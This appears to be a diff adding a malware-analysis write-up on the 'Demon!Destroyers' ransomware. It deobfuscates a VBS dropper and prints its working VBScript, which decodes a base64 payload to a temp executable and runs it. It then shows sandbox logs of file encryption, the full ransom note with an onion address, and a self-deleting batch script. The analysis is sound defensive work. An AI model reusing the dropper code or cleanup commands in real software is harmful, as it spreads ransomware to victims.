@@ -1,0 +1,196 @@
+# Demon!Destroyers Ransomware Analysis
+
+Everything starts with a VBS file. It is available on [VirusTotal](https://www.virustotal.com/gui/file/9f9027b5db5c408ee43ef2a7c7dd1aecbdb244ef6b16d9aafb599e8c40368967/detection). It is suspicious to have a text file sized 600KB, which already indicates it is a dropper in the first look.
+
+Digging into the file, the first line presents:
+
+```js
+code = "==A#>,A#>,A#>,A#>,A#>,A#>,A#>,A#>,A#>,...
+```
+Another clue that it is a dropper. Base64 strings often indicate that it is the encoded payload.
+
+Next line:
+
+```js
+UhSCkpilgyaYOXAgGwNbKK = array(102400, 100489, 57121, 97969, 104976, 103041, 101124, 102400, 56169, 101124, 94249, 103684, 106929, 103041, 96100, 58564, 100489, 96721,...
+```
+Array of ints. Who guess this is the key to decode the file?
+
+And the final line:
+
+```js
+ for nqhICuKfvmaJBTUKVVHLjwNRPGMyriPblQgnzQg = lbound(UhSCkpilgyaYOXAgGwNbKK) to ubound(YecHkJPerXVgZDJbl) : noXghCyOTjVIDXioctQYgyHMmbH = sqr(UhSCkpilgyaYOXAgGwNbKK(nqhICuKfvmaJBTUKVVHLjwNRPGMyriPblQgnzQg))  : ikWqcctDAwibpoPQNwYAy = sqr(YecHkJPerXVgZDJbl(nqhICuKfvmaJBTUKVVHLjwNRPGMyriPblQgnzQg)) : execute("nnWNuPYWYaCQFPZdjUGTLkvgZYqOuHXb = nnWNuPYWYaCQFPZdjUGTLkvgZYqOuHXb & chr(noXghCyOTjVIDXioctQYgyHMmbH - ikWqcctDAwibpoPQNwYAy)") : next : execute(nnWNuPYWYaCQFPZdjUGTLkvgZYqOuHXb)
+```
+OK, a loop traversing the array and an execution at the end: Dropping and Running, as in most samples.
+
+Lets make the script more readable:
+
+```js
+code = payload1					'payload to be dropped
+var1 = array(payload2)				'encrypted "command"
+var2 = array(payload3)				'key
+for var3 = lbound(var1) to ubound(var2) 	'len(key) < len(command)
+  var4 = sqr(var1(var3))  			'generates an int
+  var5 = sqr(var2(var3))  			'generates an int
+  execute("var6 = var6 & chr(var4 - var5)") 	'decryption: var6+=char(int-int)
+next 
+execute(var6)					'run the decrypted command
+```
+Now it is clear how it works and how to decode it. The following is dropped:
+
+```js
+Microsoft (R) Windows Script Host VersÆo 5.8
+Copyright (C) 1996-2001 Microsoft Corporation. Todos os direitos reservados.
+
+on error resume next
+set WshShell = CreateObject("WScript.Shell")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Path = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\Google.url"
+set oUrlLink = WshShell.CreateShortcut(Path)
+oUrlLink.TargetPath = "http://google.com"
+oUrlLink.Save(G)
+if  (FSO.FileExists(Path))  Then 
+WScript.Echo "Error!"
+else
+xml = "Msxml2.DOMDocument"
+ws = "WScript.Shell"
+bin = "bin.base64"
+bs = "base64"
+db = "Adodb.Stream"
+Set wshs = createobject(ws)
+filepath = wshs.ExpandEnvironmentStrings("%TEMP%") & "\qeSw.exe"
+end if
+
+Function a(n)
+    Dim i, j, abc
+	abc = array("!","@","%",".","?","<",">","$","#",",")
+    For i = 0 To 9
+	n = replace(n, abc(i), "")
+	Next
+	a = replace(n,"*","/")
+End Function
+
+Set oXML = CreateObject(xml)
+Set oNode = oXML.CreateElement(bs)
+oNode.dataType = bin
+oNode.text = strreverse(a(code))
+
+Set BinaryStream = CreateObject(db)
+BinaryStream.Type = 1
+BinaryStream.Open
+BinaryStream.Write oNode.nodeTypedValue
+BinaryStream.SaveToFile filepath
+wshs.Exec(filepath)
+'WshShell.Popup "This file might not be the right file type, or it might be corrupted!", 20, "Windows", 0 + 48
+```
+
+This deobfuscated script drops the payload pointed by *code* to the *qeSw.exe* executable in a temporary folder. The binary is a Borland Delphi-compiled executable and is also obfuscated, so let's move to dynamic analysis to inspect it.
+
+VBS file are not often correctly launched by analysis systems, so I recommend you to first convert it into an executable file with proper parameters. [Learn Here](https://dylanpackaging.wordpress.com/2015/08/13/compile-a-vbscript-into-an-exe-iexpress/). Alternatively, you can get the dropped file directly from [VirusTotal](https://www.virustotal.com/gui/file/8639825230d5504fd8126ed55b2d7aeb72944ffe17e762801aab8d4f8f880160/detection). 
+
+For this analysis, I will use the logs obtained from my sandbox. [Check it Here](https://corvus.inf.ufpr.br/reports/9843/) and [Here](https://www.virustotal.com/gui/file/8639825230d5504fd8126ed55b2d7aeb72944ffe17e762801aab8d4f8f880160/detection)
+
+Our created loader initiates the VBS script execution:
+
+```txt
+7/4/2020 - 14:45:42.825	Create	1480	C:\malware.exe	1488	C:\Windows\System32\cscript.exe
+```
+
+The executable file is dropped:
+
+```txt
+/4/2020 - 14:45:46.0	Write	1488	C:\Windows\System32\cscript.exe	C:\Users\Behemot\AppData\Local\Temp\qeSw.exe
+```
+
+And a process for it is created:
+
+```txt
+7/4/2020 - 14:45:46.237	Create	1488	C:\Windows\System32\cscript.exe	1928	C:\Users\Behemot\AppData\Local\Temp\qeSw.exe
+```
+
+The process starts encrypting all user files (Notice the custom file extension):
+
+```txt
+9/4/2020 - 17:45:49.137	Unknown	1480	C:\malware.exe	C:\ProgramData\Microsoft\Windows\Ringtones\Ringtone 05.wma.cb5649	
+9/4/2020 - 17:45:49.137	Unknown	1480	C:\malware.exe	C:\ProgramData\Microsoft\Windows\Ringtones\Ringtone 03.wma.cb5649
+```
+
+At some moment, it opens a notepad (Typical for ransomware, unusual for other malware families):
+
+```txt
+7/4/2020 - 14:46:9.366	Create	1928	C:\Users\Behemot\AppData\Local\Temp\qeSw.exe	2944	C:\Windows\SysWOW64\notepad.exe
+```
+
+The following file is opened:
+
+```txt
+7/4/2020 - 14:46:9.678	Open	2944	C:\Windows\SysWOW64\notepad.exe	C:\Users\Behemot\Desktop\CB5649-Readme.txt
+```
+
+And it displays the attacker message:
+
+```txt
+Hi!
+Your files are encrypted by JuniorXD.
+All encrypted files for this computer has extension: .cb5649
+
+--
+If for some reason you read this text before the encryption ended,
+this can be understood by the fact that the computer slows down, 
+and your heart rate has increased due to the ability to turn it off,
+then we recommend that you move away from the computer and accept that you have been compromised.
+Rebooting/shutdown will cause you to lose files without the possibility of recovery.
+
+--
+Our  encryption algorithms are very strong and your files are very well protected, 
+the only way to get your files back is to cooperate with us and get the decrypter program.
+
+Do not try to recover your files without a decrypter program, you may damage them and then they will be impossible to recover.
+
+For us this is just business and to prove to you our seriousness, we will decrypt you one file for free.
+Just open our website, upload the encrypted file and get the decrypted file for free.
+
+--
+
+Steps to get access on our website:
+
+1.Download and install tor-browser: https://torproject.org/
+
+2.Open our website: rnfdsgm6wb6j6su5txkekw4u4y47kp2eatvu7d6xhyn5cs4lt4pdrqqd.onion
+
+3.Put your personal code in the input form:
+
+{code_cb5649:
+2TZzViUpTZK4Ena/9vWLuWMfbDeotySIhArp052C1pOpN4JV7t
+9KIcnh7ld6ShqrKcoUXLe5AUhnGeueGVXotNamrYFuC3lz41Zj
+AtBl52xWNgLJ5UZkSrbjX8S+70RGDSF3zKmHsxJLOwF641tk6h
+38YmuOHg1GkSyJ1Yre4vYFlpDTz3ocW4Qlo36UM7O7pknkp4iI
+rA0Yy4D0Rf+MKW5zkvh6wJQbGA3AUyTdgyeznTLALOBK10Qx9a
+rnrMOX0+QeN/7tMg6ppt/SCxxofykiksBBraoNEQ==}
+```
+
+The infection id is stored in the registry.
+
+```txt
+7/4/2020 - 14:45:46.647	Write	1928	C:\Users\Behemot\AppData\Local\Temp\qeSw.exe	\REGISTRY\MACHINE\SOFTWARE\cb5649f8	cb5649f8 82 BE B4 3E FE 40 B6 D5 1 F1 DC C 26 CF 53 F0 A8 AB 4E AB 8A E6 77 7 E2 E0 7D AF 9F 74 B2 5F F D F6 F FA 22 C8 CD B5 92 EA 48 D9 F8 D8 14 DC 32 D5 BB F7 98 40 8E F2 3B 34 5C 97 5E 25 44 B7 98 C9 58 1E 93 E4 9E 89 74 88 E2 40 B6 2A C6 D 37 AC 6C 71 86 33 7 4E 4E BC 3D 81 89 96 2E DD D2 87 2 9C CC 6D A 50 7B 54 3C FF CF AE 5A 4B CB E2 1F 2C C9 E4 C4 2D 4C 3B AF 7E 48 A9 70 2C 3C 90 E4 F6 B5 42 53 D6 20 29 2
+```
+
+Execution finishes when the processes are killed (but why?):
+
+```txt
+7/4/2020 - 14:46:12.584	Terminate	1452	C:\Windows\SysWOW64\cmd.exe	2108	C:\Windows\SysWOW64\taskkill.exe
+```
+
+Well, because the process had dropped the following *.bat* file:
+
+```txt
+7/4/2020 - 14:46:9.413	Write	1928	C:\Users\Behemot\AppData\Local\Temp\qeSw.exe	C:\Users\Behemot\AppData\Local\Temp\68D9.tmp.bat
+```
+
+and it commanded the termination:
+
+```txt
+taskkill /F /PID 1928
+del "C:\Users\Behemot\AppData\Local\Temp\qeSw.exe"
+del %0
+```
